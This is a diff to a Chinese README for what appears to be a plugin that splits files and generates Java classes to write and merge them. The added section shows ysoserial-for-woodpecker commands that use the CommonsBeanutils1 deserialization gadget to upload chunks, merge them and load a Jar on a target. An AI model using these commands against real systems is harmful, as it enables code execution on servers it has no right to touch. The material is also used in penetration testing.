@@ -4,6 +4,21 @@
 1. 一键生成将文件分片
 2. 动态生成分片文件写入与合并执行的Class
 
+仅提供文件分片与Class生成功能，如需结合反序列化漏洞可使用`ysoserial-for-woodpecker`
+上传分片文件
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "upload_file:分块1-10.file"
+```
+
+合并分片文件
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "class_file:MergeByNameCode1.class"
+```
+加载Jar
+```
+java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "class_file:FileloaderInvokeFIlename.class"
+```
+测试发现BCEL没办法加载动态生成的Class
 
 ## 说明
 1.FileSplitPlugin文件分片
